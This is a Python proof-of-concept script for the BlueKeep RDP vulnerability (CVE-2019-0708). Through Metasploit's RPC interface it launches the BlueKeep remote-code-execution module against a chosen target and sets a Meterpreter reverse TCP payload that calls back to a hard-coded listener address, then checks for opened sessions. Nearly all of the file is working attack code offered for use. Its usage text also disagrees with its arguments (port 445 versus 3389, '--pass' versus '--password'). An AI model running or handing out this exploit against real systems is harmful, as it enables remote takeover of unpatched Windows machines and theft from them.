#!/usr/bin/env python3
"""
bluekeep_poc.py

Proof‐of‐Concept for CVE-2019-0708 (“BlueKeep”) using Metasploit’s RPC interface.
This script connects to an msfrpcd service and launches the built‐in `exploit/windows/rdp/cve_2019_0708_bluekeep_rce`
module against the target. Requires:
  • Metasploit Framework installed offline with msfrpcd enabled.
  • A valid user/password for msfrpcd (configure msfrpcd with -U <user> -P <pass>),
    and ensure the `cve_2019_0708_bluekeep_rce` module is available.

Usage:
   python3 bluekeep_poc.py --target <ip> [--port 445] [--msfrpc_host 127.0.0.1] [--msfrpc_port 55553] [--user msf --pass abc123]

Example:
   python3 bluekeep_poc.py --target 192.168.1.60 --msfrpc_host 127.0.0.1 --msfrpc_port 55553 --user msf --pass abc123

Note:
   msfrpcd must already be running, e.g.:
       msfrpcd -U msf -P abc123 -a 127.0.0.1 -p 55553 -f -S
"""

import sys
import argparse
import time
import logging
from metasploit.msfrpc import MsfRpcClient

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger("bluekeep_poc")

def parse_args():
    parser = argparse.ArgumentParser(description="BlueKeep (CVE-2019-0708) PoC via msfrpc")
    parser.add_argument("--target", required=True, help="IP of the RDP server (Windows 7/Server 2008 R2)")
    parser.add_argument("--port", type=int, default=3389, help="RDP port (default=3389)")
    parser.add_argument("--msfrpc_host", default="127.0.0.1", help="msfrpcd host")
    parser.add_argument("--msfrpc_port", type=int, default=55553, help="msfrpcd port")
    parser.add_argument("--user", required=True, help="msfrpcd username")
    parser.add_argument("--password", required=True, help="msfrpcd password")
    return parser.parse_args()

def exploit_bluekeep(target, rdp_port, msfrpc_host, msfrpc_port, user, passwd):
    """
    1) Connect to msfrpcd
    2) Use module ‘exploit/windows/rdp/cve_2019_0708_bluekeep_rce’
    3) Set RHOSTS and RPORT
    4) Launch exploit, get job ID
    5) Wait briefly and query sessions
    """
    try:
        logger.info(f"[+] Connecting to msfrpcd at {msfrpc_host}:{msfrpc_port} as {user}")
        client = MsfRpcClient(passwd, server=msfrpc_host, port=msfrpc_port, username=user)
        logger.info("[+] Authenticated to msfrpcd")

        mod = client.modules.use("exploit", "windows/rdp/cve_2019_0708_bluekeep_rce")
        mod["RHOSTS"] = target
        mod["RPORT"] = rdp_port
        mod["PAYLOAD"] = "windows/x64/meterpreter/reverse_tcp"
        # Adjust LHOST/LPORT to your listener (if you want a shell). For pure crash, you can omit payload.
        mod["LHOST"] = "192.168.1.10"
        mod["LPORT"] = 4444

        logger.info("[+] Launching BlueKeep exploit...")
        job_id = mod.execute()
        logger.info(f"[+] Module job queued as ID {job_id}, waiting 15s for sessions")
        time.sleep(15)

        sessions = client.sessions.list
        if sessions:
            logger.info(f"[+] Sessions: {sessions}")
            return {"status":"ok", "sessions": sessions}
        else:
            return {"status":"error", "detail":"No sessions – target might not be vulnerable or network blocked."}
    except Exception as e:
        return {"status":"error", "detail": str(e)}

def main():
    args = parse_args()
    res = exploit_bluekeep(
        args.target,
        args.port,
        args.msfrpc_host,
        args.msfrpc_port,
        args.user,
        args.password
    )
    print(f"[*] Result: {res}")

if __name__ == "__main__":
    main()
